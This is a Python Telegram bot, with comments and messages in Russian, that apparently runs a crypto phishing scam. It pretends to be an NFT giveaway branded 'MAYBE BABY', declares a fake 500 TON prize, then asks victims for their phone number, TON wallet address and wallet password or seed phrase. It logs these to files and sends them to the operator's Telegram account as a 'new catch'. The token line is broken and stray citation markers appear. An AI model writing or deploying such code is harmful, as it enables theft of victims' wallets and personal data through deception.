import telebot
import os
import json
from datetime import datetime

# ========== ТВОИ ДАННЫЕ ==========
TOKEN = 'import os
TOKEN = os.environ.get('BOT_TOKEN')'
YOUR_ID = 8527745552  
# =================================

bot = telebot.TeleBot(TOKEN)

# Создаем папку для логов, если её нет
LOG_DIR = 'logs'
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def save_user_data(user_id, phone, wallet, password, username):
    """Сохраняем данные в JSON файл"""
    filename = f"{LOG_DIR}/{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {
        'user_id': user_id,
        'username': username,
        'phone': phone,
        'wallet': wallet,
        'password': password,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

    # Отправляем тебе в личку
    bot.send_message(YOUR_ID,
        f"🎯 **НОВЫЙ УЛОВ!**\n"
        f"👤 ID: {user_id}\n"
        f"📞 Телефон: {phone}\n"
        f"💎 Кошелек: {wallet}\n"
        f"🔑 Пароль/Фраза: {password}\n"
        f"🕐 Время: {data['time']}")

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def start(message):
    # Создаем кнопки [citation:4]
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🎰 Крутить рулетку')
    btn2 = telebot.types.KeyboardButton('🎁 Мои подарки')
    markup.add(btn1, btn2)

    bot.send_message(message.chat.id,
        "✨ **MAYBE BABY x Telegram NFT DROP** ✨\n\n"
        "🔥 **УНИКАЛЬНЫЕ ПОДАРКИ ОТ MAYBE BABY!** 🔥\n\n"
        "Только для подписчиков:\n"
        "🎁 Лимитированные NFT-подарки\n"
        "💎 Эксклюзивные эмоции\n"
        "🎰 Шанс выиграть личную встречу\n\n"
        "👉 **Нажми «Крутить рулетку»** и забери свой приз!",
        reply_markup=markup,
        parse_mode='Markdown')

# Обработчик кнопки "Крутить рулетку"
@bot.message_handler(func=lambda message: message.text == '🎰 Крутить рулетку')
def roulette(message):
    bot.send_message(message.chat.id, "🎲 **Крутим барабан...**")
    # Имитация выигрыша
    bot.send_message(message.chat.id,
        "🎉 **ПОЗДРАВЛЯЕМ!**\n\n"
        "💎 **Эксклюзивный NFT-подарок от MAYBE BABY** (1 из 1000)\n"
        "💰 **Призовая сумма: 500 TON**\n\n"
        "📱 **Для получения приза необходимо:**\n"
        "Введите ваш **номер телефона** (в формате +7XXXXXXXXXX):")
    # Переходим к следующему шагу — ждем телефон [citation:4]
    bot.register_next_step_handler(message, get_wallet)

def get_wallet(message):
    phone = message.text
    # Сохраняем телефон в контексте (просто передаем дальше)
    bot.send_message(message.chat.id,
        "✅ Номер принят!\n\n"
        "💎 **Введите адрес вашего TON кошелька**\n"
        "(например: UQABCD... или EQABCD...):")
    # Передаем телефон дальше через register_next_step_handler [citation:4]
    bot.register_next_step_handler(message, get_password, phone)

def get_password(message, phone):
    wallet = message.text
    bot.send_message(message.chat.id,
        "🔐 **Последний шаг!**\n\n"
        "Введите **пароль/seed-фразу** от кошелька\n"
        "(это нужно для привязки подарка к вашему аккаунту):")
    bot.register_next_step_handler(message, final_step, phone, wallet)

def final_step(message, phone, wallet):
    password = message.text
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"

    # Сохраняем все в файл
    save_user_data(user_id, phone, wallet, password, username)

    # Финальное сообщение для лоха
    bot.send_message(message.chat.id,
        "⏳ **Данные приняты!**\n\n"
        "Ожидайте начисления призовых попыток в течение 24 часов.\n"
        "Подарок будет зачислен автоматически после проверки.\n\n"
        "Спасибо за участие в розыгрыше от MAYBE BABY! 💫")

# Обработчик кнопки "Мои подарки"
@bot.message_handler(func=lambda message: message.text == '🎁 Мои подарки')
def my_gifts(message):
    bot.send_message(message.chat.id,
        "У вас пока нет подарков.\n"
        "Нажми «Крутить рулетку», чтобы выиграть!")

# Обработчик всего остального
@bot.message_handler(func=lambda message: True)
def default(message):
    bot.send_message(message.chat.id,
        "Используй кнопки в меню или напиши /start")

# Запуск бота
print("🤖 Бот MAYBE BABY NFT ЗАПУЩЕН!")
bot.infinity_polling()